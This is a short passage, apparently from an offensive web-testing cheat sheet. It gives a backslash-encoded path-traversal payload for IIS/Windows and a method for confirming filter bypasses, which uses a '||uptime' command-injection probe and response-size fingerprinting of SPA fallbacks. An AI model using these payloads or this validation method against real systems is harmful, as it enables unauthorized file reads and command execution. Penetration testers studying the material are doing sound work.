..%5C..%5C           (backslash)          — works on IIS/Windows, not Linux

# === VALIDATION (§7) — DO THIS EVERY TIME ===
# Run every bypass against TWO targets in parallel:
#   A) a known-good probe (a file you can fetch directly, or ||uptime for cmdi)
#   B) the actual target
# If A succeeds, the bypass works. If A also returns SPA-fallback size, the
# bypass DIDN'T land — stop scaling that payload.
#
# SPA-fallback fingerprint: 200 status with response size within ~50 bytes of
# the homepage baseline. Status code alone never confirms a bypass.
```
